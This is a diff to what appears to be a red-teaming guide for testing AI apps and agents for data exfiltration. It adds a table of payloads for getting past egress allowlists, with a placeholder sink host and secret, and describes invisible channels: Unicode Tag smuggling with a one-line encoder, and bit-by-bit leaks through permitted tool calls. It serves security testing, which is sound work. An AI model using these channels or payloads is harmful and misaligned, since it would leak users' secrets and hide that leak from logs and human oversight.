@@ -46,6 +46,41 @@ If the app shows the answer but never fetches:
 - **Link** — `[click](https://<you>/?d=<data>)`; fires on user click (lower confidence).
 - **Tool call** — have the agent call its own HTTP tool to your host (highest signal).
 
+## Getting past an egress allowlist
+
+If recon found a domain allowlist, the plain `{{SINK}}` URL will be blocked and the naive
+conclusion is "exfil mitigated." It usually is not. Walk this table top to bottom and record
+*which* transformation defeated *which* control — that mapping is the fixable finding.
+
+| Bypass | Payload |
+| --- | --- |
+| Userinfo confusion | `https://allowed.example@{{SINK}}/x` |
+| Subdomain | `https://{{SINK}}.allowed.example/x` |
+| Open redirect | `https://allowed.example/r?to=https://{{SINK}}/x` |
+| Fragment confusion | `https://allowed.example#@{{SINK}}/x` |
+| Protocol-relative | `//{{SINK}}/x` |
+| Backslash / parser diff | `https://allowed.example\@{{SINK}}` |
+| Encoding | `%2f`, `%252f`, IDN homograph |
+| Redirect chain | a 302 on an allowlisted host to your host |
+| DNS | `<canary>.{{SINK}}` — fires when HTTP egress is blocked entirely |
+| Link unfurl | a URL pasted into a Slack/Teams/Notion-integrated agent is fetched **server-side by their infra**, not the target app |
+| Rendered HTML | `background:url(https://{{SINK}}/x)` in markdown/HTML the app renders |
+| Client-side | `![x](https://{{SINK}}/x)` — the user's browser fetches on render |
+| Non-HTTP schemes | `mailto:?body={{SECRET}}`, `file://`, `tel:` |
+| Write-then-read | write the secret to a file with one tool, read it with another you are permitted to use |
+
+## Invisible channels
+
+The strongest exfil does not look like exfil:
+
+- **Unicode Tags (ASCII smuggling).** Have the model emit the secret as `U+E0020`–`U+E007E`
+  characters in the answer. Invisible to the user, invisible in logs, no egress control ever
+  sees it. `"".join(chr(0xE0000 + ord(c)) for c in secret)`.
+- **Variation selectors** — the same trick with a different alphabet.
+- **Oracle / bit-by-bit.** One bit per permitted tool call; no bulk transfer, no blocked host,
+  no anomalous request. `if key[0] == 'a': call ping('a') else: call ping('b')`.
+- **Conditional side effect** — a file named after the bit; read it later.
+
 ## Safety
 
 - Point tools at `169.254.169.254` to distinguish cloud-metadata SSRF from generic fetch.
